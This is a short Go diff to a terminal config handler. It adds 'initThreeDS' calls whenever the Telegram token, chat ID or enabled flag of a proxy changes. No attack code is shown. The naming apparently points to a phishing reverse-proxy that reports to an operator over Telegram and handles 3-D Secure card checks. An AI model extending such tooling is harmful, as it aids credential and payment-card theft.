@@ -399,11 +399,13 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.cfg.SetTelegramBotToken(args[2])
 				// Update the proxy's telegram instance
 				t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), t.cfg.GetTelegramEnabled())
+				t.p.initThreeDS()
 				return nil
 			case "chat_id":
 				t.cfg.SetTelegramChatID(args[2])
 				// Update the proxy's telegram instance
 				t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), t.cfg.GetTelegramEnabled())
+				t.p.initThreeDS()
 				return nil
 			case "enabled":
 				switch args[2] {
@@ -411,11 +413,13 @@ func (t *Terminal) handleConfig(args []string) error {
 					t.cfg.SetTelegramEnabled(true)
 					// Update telegram bot - SetConfig auto-starts the worker
 					t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), true)
+					t.p.initThreeDS()
 					return nil
 				case "false":
 					t.cfg.SetTelegramEnabled(false)
 					// Update the proxy's telegram instance
 					t.p.telegram.SetConfig(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), false)
+					t.p.initThreeDS()
 					return nil
 				}
 			}
